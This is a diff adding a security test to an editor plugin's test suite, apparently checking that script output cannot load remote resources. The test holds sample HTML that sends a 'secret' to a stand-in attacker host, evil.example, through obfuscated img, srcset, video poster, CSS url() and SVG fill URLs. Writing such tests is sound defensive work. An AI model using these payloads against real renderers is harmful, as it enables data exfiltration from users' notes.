@@ -111,6 +111,21 @@ describe('script blocks', () => {
     expect(out.querySelectorAll('.cm-lp-script-noimage')).toHaveLength(2);
   });
 
+  it('loads nothing from another site, however the output spells the URL (security audit)', async () => {
+    // What a script that read the vault would show to send it away in an image request.
+    const leak =
+      '<img src="https:\\\\evil.example\\x?d=secret"> <img src="/\\evil.example/y?d=secret"> ' +
+      '<img src="Attachments/a.png" srcset=",https://evil.example/z?d=secret 2x"> ' +
+      '<video poster="https:\\\\evil.example\\p?d=secret"></video> ' +
+      '<span style="background:u\\rl(https://evil.example/w?d=secret)">s</span> ' +
+      '<svg xmlns="http://www.w3.org/2000/svg"><rect fill="url(https://evil.example/f.svg?d=secret#p)"></rect></svg>';
+    const view = noteEditor(NOTE, { mode: 'locked', config: { remoteImages: true }, ctx: app(async () => outcome(leak)) });
+    await waitFor(() => expect(view.contentDOM.querySelector('.cm-lp-script-output')).not.toBeNull());
+    const out = view.contentDOM.querySelector('.cm-lp-script-output')!;
+    expect(out.innerHTML).not.toContain('evil.example');
+    expect(out.querySelectorAll('.cm-lp-script-noimage')).toHaveLength(2);
+  });
+
   it('runs again (debounced) when a note it read changes, and not for other notes', async () => {
     let n = 0;
     const run = vi.fn(async () => outcome(`run ${++n}`, { reads: { paths: new Set(['Other.md']), broad: false } }));
